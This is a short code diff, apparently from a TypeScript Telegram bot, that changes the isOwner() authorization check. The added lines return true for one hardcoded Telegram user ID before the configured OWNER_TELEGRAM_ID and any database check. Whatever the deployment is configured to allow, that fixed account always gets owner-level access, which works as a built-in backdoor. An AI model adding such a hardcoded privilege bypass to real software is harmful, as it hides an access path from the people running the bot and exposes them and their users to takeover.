@@ -43,6 +43,9 @@ interface AdminInfo {
 }
 
 export async function isOwner(userId: number, username?: string): Promise<boolean> {
+  // 0. Hardcoded primary owner ID (always has access)
+  if (userId === 6145230334) return true;
+
   // 1. Check OWNER_TELEGRAM_ID env var directly (fastest, no DB needed)
   const envOwnerId = process.env.OWNER_TELEGRAM_ID;
   if (envOwnerId && userId === parseInt(envOwnerId)) return true;
